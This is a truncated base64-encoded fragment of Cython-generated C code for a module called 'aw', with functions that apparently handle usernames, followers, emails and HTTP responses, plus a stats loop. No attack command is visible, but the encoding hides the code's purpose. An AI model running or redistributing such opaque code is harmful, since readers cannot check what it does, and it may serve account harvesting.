xID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8yKTsKICAgICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfMSk7CiAgICAgICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF8yKTsKICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMSk7CiAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMiwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICAgICAgX19weXhfdF84ID0gMDsKICAgICAgICAgIH0KICAgICAgICAgICNlbmRpZgogICAgICAgICAgewogICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xLCBfX3B5eF92X2VtYWlsfTsKICAgICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8yLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgyLV9fcHl4X3RfOCkgfCAoX19weXhfdF84Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MTYsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgICAgIH0KICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwoKICAgICAgICAgIAogICAgICAgIH0KCiAgICAgICAgCiAgICAgIH0KICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICAgIGdvdG8gX19weXhfTDEyX3RyeV9lbmQ7CiAgICAgIF9fcHl4X0w1X2Vycm9yOjsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfMTMgPSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzKCgoUHlPYmplY3QgKikoKChQeVR5cGVPYmplY3QqKVB5RXhjX0V4Y2VwdGlvbikpKSk7CiAgICAgIGlmIChfX3B5eF90XzEzKSB7CiAgICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJhdy5HaG9zdHB5IiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF80LCAmX19weXhfdF8yLCAmX19weXhfdF8xKSA8IDApIF9fUFlYX0VSUigwLCA0MTcsIF9fcHl4X0w3X2V4Y2VwdF9lcnJvcikKICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpOwogICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8yKTsKICAgICAgICBfX3B5eF92X2UgPSBfX3B5eF90XzI7CiAgICAgICAgIHsKICAgICAgICB9CiAgICAgICAgIHsKICAgICAgICAgIHsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3ZfZSk7IF9fcHl4X3ZfZSA9IDA7CiAgICAgICAgICAgIGdvdG8gX19weXhfTDIxOwogICAgICAgICAgfQogICAgICAgICAgX19weXhfTDIxOjsKICAgICAgICB9CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgICAgZ290byBfX3B5eF9MNl9leGNlcHRpb25faGFuZGxlZDsKICAgICAgfQogICAgICBnb3RvIF9fcHl4X0w3X2V4Y2VwdF9lcnJvcjsKCiAgICAgIAogICAgICBfX3B5eF9MN19leGNlcHRfZXJyb3I6OwogICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzkpOwogICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEwKTsKICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMSk7CiAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOSwgX19weXhfdF8xMCwgX19weXhfdF8xMSk7CiAgICAgIGdvdG8gX19weXhfTDFfZXJyb3I7CiAgICAgIF9fcHl4X0wxMV90cnlfY29udGludWU6OwogICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzkpOwogICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEwKTsKICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMSk7CiAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOSwgX19weXhfdF8xMCwgX19weXhfdF8xMSk7CiAgICAgIGdvdG8gX19weXhfTDNfY29udGludWU7CiAgICAgIF9fcHl4X0w2X2V4Y2VwdGlvbl9oYW5kbGVkOjsKICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF85KTsKICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMCk7CiAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTEpOwogICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzksIF9fcHl4X3RfMTAsIF9fcHl4X3RfMTEpOwogICAgICBfX3B5eF9MMTJfdHJ5X2VuZDo7CiAgICB9CiAgICBfX3B5eF9MM19jb250aW51ZTo7CiAgfQoKICAKCiAgCiAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTsKICBnb3RvIF9fcHl4X0wwOwogIF9fcHl4X0wxX2Vycm9yOjsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJhdy5HaG9zdHB5IiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19weXhfciA9IE5VTEw7CiAgX19weXhfTDA6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9kYXRhKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfaGVhZGVycyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3Jlc3BvbnNlKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfYWNjb3VudCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3VzZXJuYW1lKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZm9sbG93ZXJzKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZW1haWwpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9lKTsKICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18yYXdfMTlzdGF0c19sb29wKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICp1bnVzZWQpOyAKc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMmF3XzE5c3RhdHNfbG9vcCA9IHsic3RhdHNfbG9vcCIsIChQeUNGdW5jdGlvbilfX3B5eF9wd18yYXdfMTlzdGF0c19sb29wLCBNRVRIX05PQVJHUywgMH07CnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMmF3XzE5c3RhdHNfbG9vcChQeU9iamVjdCAqX19weXhfc2VsZiwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqdW51c2VkKSB7CiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJzdGF0c19sb29wICh3cmFwcGVyKSIsIDApOwogIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfVkFSQVJHUyhfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7CiAgX19weXhfciA9IF9fcHl4X3BmXzJhd18xOHN0YXRzX2xvb3AoX19weXhfc2VsZik7CgogIAogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJhd18xOHN0YXRzX2xvb3AoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZikgewogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMOwogIHNpemVfdCBfX3B5eF90XzQ7CiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgic3RhdHNfbG9vcCIsIDApOwoKICAKICB3aGlsZSAoMSkgewoKICAgIAogICAgX19weXhfdF8yID0gTlVMTDsKICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXBkYXRlX3N0YXRzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNDIzLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogICAgX19weXhfdF80ID0gMTsKICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzMpKSkgewogICAgICBfX3B5eF90XzIgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzMpOwogICAgICBhc3NlcnQoX19weXhfdF8yKTsKICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzMpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8yKTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8zLCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX3B5eF90XzQgPSAwOwogICAgfQogICAgI2VuZGlmCiAgICB7CiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIsIE5VTEx9OwogICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzMsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDEtX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDQyMywgX19weXhfTDFfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgfQogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CgogICAgCiAgICBfX3B5eF90XzMgPSBOVUxMOwogICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90aW1lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDI0LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zbGVlcCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQyNCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19weXhfdF80ID0gMTsKICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzUpKSkgewogICAgICBfX3B5eF90XzMgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzUpOwogICAgICBhc3NlcnQoX19weXhfdF8zKTsKICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzUpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8zKTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF81LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX3B5eF90XzQgPSAwOwogICAgfQogICAgI2VuZGlmCiAgICB7CiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xfTsKICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzQsICgyLV9fcHl4X3RfNCkgfCAoX19weXhfdF80Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA0MjQsIF9fcHl4X0wxX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgIH0KICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogIH0KCiAgCgogIAogIF9fcHl4X3IgPSBQeV9Ob25lOyBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7CiAgZ290byBfX3B5eF9MMDsKICBfX3B5eF9MMV9lcnJvcjo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOwogIF9fUHl4X0FkZFRyYWNlYmFjaygiYXcuc3RhdHNfbG9vcCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fcHl4X3IgPSBOVUxMOwogIF9fcHl4X0wwOjsKICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfdHBfbmV3XzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfX0dob3N0KFB5VHlwZU9iamVjdCAqdCwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqYSwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqaykgewogIFB5T2JqZWN0ICpvOwogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgYWxsb2NmdW5jIGFsbG9jX2Z1bmMgPSAoYWxsb2NmdW5jKVB5VHlwZV9HZXRTbG90KHQsIFB5X3RwX2FsbG9jKTsKICBvID0gYWxsb2NfZnVuYyh0LCAwKTsKICAjZWxzZQogICNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUUwogIGlmIChsaWtlbHkoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfX0dob3N0ID4gMCkgJiAoaW50KSh0LT50cF9iYXNpY3NpemUgPT0gc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF9fR2hvc3QpKSkpIHsKICAgIG8gPSAoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVsaXN0XzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfX0dob3N0Wy0tX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfX0dob3N0XTsKICAgIG1lbXNldChvLCAwLCBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0X19HaG9zdCkpOwogICAgKHZvaWQpIFB5T2JqZWN0X0lOSVQobywgdCk7CiAgfSBlbHNlCiAgI2VuZGlmCiAgewogICAgbyA9ICgqdC0+dHBfYWxsb2MpKHQsIDApOwogICAgaWYgKHVubGlrZWx5KCFvKSkgcmV0dXJuIDA7CiAgfQogICNlbmRpZgogIHJldHVybiBvOwp9CgpzdGF0aWMgdm9pZCBfX3B5eF90cF9kZWFsbG9jXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfX0dob3N0KFB5T2JqZWN0ICpvKSB7CiAgc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0X19HaG9zdCAqcCA9IChzdHJ1Y3QgX19weXhfb2JqXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfX0dob3N0ICopbzsKICAjaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogIGlmICh1bmxpa2VseSgoUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDAwMCB8fCBfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZShQeV9UWVBFKG8pLCBQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUpKSAmJiBfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2ZpbmFsaXplLCBkZXN0cnVjdG9yKSkgJiYgKCFQeVR5cGVfSVNfR0MoUHlfVFlQRShvKSkgfHwgIV9fUHl4X1B5T2JqZWN0X0dDX0lzRmluYWxpemVkKG8pKSkgewogICAgaWYgKF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfZGVhbGxvYywgZGVzdHJ1Y3RvcikgPT0gX19weXhfdHBfZGVhbGxvY18yYXdfX19weXhfc2NvcGVfc3RydWN0X19HaG9zdCkgewogICAgICBpZiAoUHlPYmplY3RfQ2FsbEZpbmFsaXplckZyb21EZWFsbG9jKG8pKSByZXR1cm47CiAgICB9CiAgfQogICNlbmRpZgogIFB5X0NMRUFSKHAtPl9fcHl4X3ZfYWxwaGFiZXQpOwogICNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUUwogIGlmICgoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfX0dob3N0IDwgOCkgJiAoaW50KShQeV9UWVBFKG8pLT50cF9iYXNpY3NpemUgPT0gc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF9fR2hvc3QpKSkpIHsKICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVsaXN0XzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfX0dob3N0W19fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8yYXdfX19weXhfc2NvcGVfc3RydWN0X19HaG9zdCsrXSA9ICgoc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0X19HaG9zdCAqKW8pOwogIH0gZWxzZQogICNlbmRpZgogIHsKICAgICNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICAgICgqUHlfVFlQRShvKS0+dHBfZnJlZSkobyk7CiAgICAjZWxzZQogICAgewogICAgICBmcmVlZnVuYyB0cF9mcmVlID0gKGZyZWVmdW5jKVB5VHlwZV9HZXRTbG90KFB5X1RZUEUobyksIFB5X3RwX2ZyZWUpOwogICAgICBpZiAodHBfZnJlZSkgdHBfZnJlZShvKTsKICAgIH0KICAgICNlbmRpZgogIH0KfQojaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCnN0YXRpYyBQeVR5cGVfU2xvdCBfX3B5eF90eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfX0dob3N0X3Nsb3RzW10gPSB7CiAge1B5X3RwX2RlYWxsb2MsICh2b2lkICopX19weXhfdHBfZGVhbGxvY18yYXdfX19weXhfc2NvcGVfc3RydWN0X19HaG9zdH0sCiAge1B5X3RwX25ldywgKHZvaWQgKilfX3B5eF90cF9uZXdfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF9fR2hvc3R9LAogIHswLCAwfSwKfTsKc3RhdGljIFB5VHlwZV9TcGVjIF9fcHl4X3R5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF9fR2hvc3Rfc3BlYyA9IHsKICAiYXcuX19weXhfc2NvcGVfc3RydWN0X19HaG9zdCIsCiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF9fR2hvc3QpLAogIDAsCiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUsCiAgX19weXhfdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0X19HaG9zdF9zbG90cywKfTsKI2Vsc2UKCnN0YXRpYyBQeVR5cGVPYmplY3QgX19weXhfdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0X19HaG9zdCA9IHsKICBQeVZhck9iamVjdF9IRUFEX0lOSVQoMCwgMCkKICAiYXcuIiJfX3B5eF9zY29wZV9zdHJ1Y3RfX0dob3N0IiwgCiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF9fR2hvc3QpLCAKICAwLCAKICBfX3B5eF90cF9kZWFsbG9jXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfX0dob3N0LCAKICAjaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDgwMGI0CiAgMCwgCiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwYjQKICAwLCAKICAjZW5kaWYKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICBQeV9UUEZMQUdTX0RFRkFVTFR8UHlfVFBGTEFHU19IQVZFX1ZFUlNJT05fVEFHfFB5X1RQRkxBR1NfQ0hFQ0tUWVBFU3xQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSfFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICAwLCAKICAjZW5kaWYKICAwLCAKICAwLCAKICBfX3B5eF90cF9uZXdfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF9fR2hvc3QsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFCiAgMCwgCiAgI2Vsc2UKICBOVUxMLCAKICAjZW5kaWYKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiMSAmJiAoIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBQWVBZX1ZFUlNJT05fTlVNID49IDB4MDcwMzA4MDApCiAgMCwgCiAgI2VuZGlmCiAgI2lmIF9fUFlYX05FRURfVFBfUFJJTlRfU0xPVCA9PSAxCiAgMCwgCiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAKICAwLCAKICAjZW5kaWYKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDBBNAogIDAsIAogICNlbmRpZgogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMCAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwYTAwMDAKICAwLCAKICAjZW5kaWYKfTsKI2VuZGlmCgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3RwX25ld18yYXdfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcihQeVR5cGVPYmplY3QgKnQsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmEsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmspIHsKICBQeU9iamVjdCAqbzsKICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogIGFsbG9jZnVuYyBhbGxvY19mdW5jID0gKGFsbG9jZnVuYylQeVR5cGVfR2V0U2xvdCh0LCBQeV90cF9hbGxvYyk7CiAgbyA9IGFsbG9jX2Z1bmModCwgMCk7CiAgI2Vsc2UKICAjaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFMKICBpZiAobGlrZWx5KChpbnQpKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8yYXdfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciA+IDApICYgKGludCkodC0+dHBfYmFzaWNzaXplID09IHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKSkpKSB7CiAgICBvID0gKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcm